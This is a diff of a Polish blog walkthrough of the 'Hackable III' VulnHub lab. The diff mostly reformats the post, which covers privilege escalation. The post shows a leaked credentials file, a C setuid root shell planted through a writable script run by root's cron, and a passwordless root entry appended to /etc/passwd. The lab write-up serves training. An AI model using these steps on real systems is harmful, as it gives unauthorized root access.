@@ -132,8 +132,9 @@ W **2.txt** jest kod w Brainfuck (**++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>
 4444
 ```
 **http://172.16.1.103/3.jpg** jest to plik graficzny, a w nim pewnie ukryty przekaz. Nie miałem wcześniej do czynienia z łamaniem obrazków, więc nie rozkminiłem tej zagadki, ale **Elias Sousa** mi podpowiedział. 
-{: .notice--info}
+{: .text-justify}
 **Binwalk** nie znalazł nic ciekawego.
+{: .text-justify}
 ```bash
 # root@kali:/home/szikers/hackable3/3# binwalk 3.jpg
 
@@ -205,7 +206,7 @@ W katalogu **scripts** jest plik **tetris.sh**. Po uruchomieniu brakuje w nim pl
 {: .text-justify}
 {% include gallery id="gallery4_5"  %}
 ## Zostawcie Shelltris w spokoju 
-Shelltris to pułapka, zostawcie to. Wcześniej pominąłem jedną ważną rzecz, a to mnie zablokowało na dłużej. Co prawda podpatrzyłem w [solucji](https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/) tylko tą jedną rzecz, bo i tak rozwiązanie jest inne i **Eliasa Soulsa** też coś pokazał, ale zrobiłem to po swojemu. Jeszcze raz przeszedłem do katalogu **/var/www/html**
+**Shelltris** to pułapka, zostawcie to. Wcześniej pominąłem jedną ważną rzecz, a to mnie zablokowało na dłużej. Co prawda podpatrzyłem w [solucji](https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/) tylko tą jedną rzecz, bo i tak rozwiązanie jest inne i **Eliasa Soulsa** też coś pokazał, ale zrobiłem to po swojemu. Jeszcze raz przeszedłem do katalogu **/var/www/html**
 {: .text-justify}
 ```bash
 # jubiscleudo@ubuntu20:/var/www/html$ ls -la
@@ -229,6 +230,8 @@ drwxr-xr-x 5 www-data www-data  4096 Jun 30 20:37 login_page
 ```
 Pominąłem **.backup_config.php**, a w nim jest login i hasło dla użytkownika **hackable_3**
 {: .text-justify}
+<div class="notice--primary" markdown="1">
+.backup_config.php
 ```php
 <?php
 /* Database credentials. Assuming you are running MySQL
@@ -249,13 +252,13 @@ if($conexao === false){
 }
 ?>
 ```
+</div>
 ## Grupa adm
 Logując się na **Shell**a użytkownika **hackable_3** i wypisując komendę **id** zauważyłem takie coś:
 {: .text-justify}
-```console
-hackable_3@ubuntu20:/var/www/html$ id
+```bash
+# hackable_3@ubuntu20:/var/www/html$ id
 uid=1000(hackable_3) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
-hackable_3@ubuntu20:/var/www/html$
 ```
 **hackable_3** jest w grupie **adm**. Poszukajmy, to może coś znajdziemy ciekawego:
 {: .text-justify}
@@ -290,9 +293,11 @@ Aug 10 22:36:01 ubuntu20 CRON[5187]: (root) CMD (python3 /scripts/to_hackable_3.
 Aug 10 22:38:01 ubuntu20 CRON[5193]: (root) CMD (python3 /scripts/to_hackable_3.py)
 Aug 10 22:40:01 ubuntu20 CRON[5201]: (root) CMD (python3 /scripts/to_hackable_3.py)
 ```
-## Włany Rootshell
-**Crontab** nie może uruchomić z **Root**a programu **/scripts/to_hackable_3.py**. Akcja działa co 2 minuty. Pomóżmy mu, aby się **Crontab** nie męczył. :smiley: Ale zanim to nastąpi skompilujmy u siebie na konsoli (niestety nie mamy tutaj **gcc**) prosty **rootshell** i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na **Root**a z innego użytkownika, więc najlepiej napisać program i go skompilować:
+## Rootshell
+**Crontab** nie może uruchomić z **Root**a programu **/scripts/to_hackable_3.py**. Akcja działa co 2 minuty. Pomóżmy mu, aby się **Crontab** nie męczył. :smiley: Ale zanim to nastąpi skompilujmy u siebie na konsoli (niestety nie mamy tutaj **gcc**) prosty **rootshell** napisany w języku **C** i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na **Root**a z innego użytkownika, więc najlepiej napisać program i go skompilować:
 {: .text-justify}
+<div class="notice--primary" markdown="1">
+rootshell
 ```c
 void main()
 { setuid(0);
@@ -300,18 +305,22 @@ void main()
   system("/bin/bash");
 }
 ```
-Rootshell wrzucamy do katalogu:
+</div>
+**Rootshell** wrzucamy do katalogu:
 {: .text-justify}
 ```bash
 # cp /home/hackable_3/rootshell /scripts/
 ```
 A zawartość **/scripts/to_hackable_3.py** może wyglądać tak:
 {: .text-justify}
+<div class="notice--primary" markdown="1">
+to_hackable_3.py
 ```python
 from os import system
 system('chown root:root /scripts/rootshell && chmod u+s /scripts/rootshell')
 ```
-Czekamy z 2 minuty, aby Crontab odwalił za nas robotę:
+</div>
+Czekamy z 2 minuty, aby **Crontab** odwalił za nas robotę:
 {: .text-justify}
 ```bash
 # hackable_3@ubuntu20:/scripts$ ls -la
@@ -324,14 +333,13 @@ drwxr-xr-x 21 root       root        4096 Apr 29 16:32 ..
 -rwxr-xr-x  1 root       root       59653 Apr 28 15:06 tetris.sh
 -rwxrwxr-x  1 hackable_3 hackable_3   251 Aug 10 21:59 to_hackable_3.py
 ```
-**Rootshell** ma Suida i **Root**a:
+**Rootshell** ma **Suid**a i **Root**a:
 ```bash
 # hackable_3@ubuntu20:/scripts$ ./rootshell
-root@ubuntu20:/scripts# id
+# root@ubuntu20:/scripts# id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd),1000(hackable_3)
-root@ubuntu20:/scripts#
 ```
-Zamiast tworzyć **rootshell**, to możemy dodać użytkownika do pliku **/etc/passwd**:
+Zamiast tworzyć **Rootshell**, to możemy dodać użytkownika do pliku **/etc/passwd**:
 {: .text-justify}
 ```bash
 # echo 'kerszi::0:0:,,,:/root:/bin/bash' >> /etc/passwd
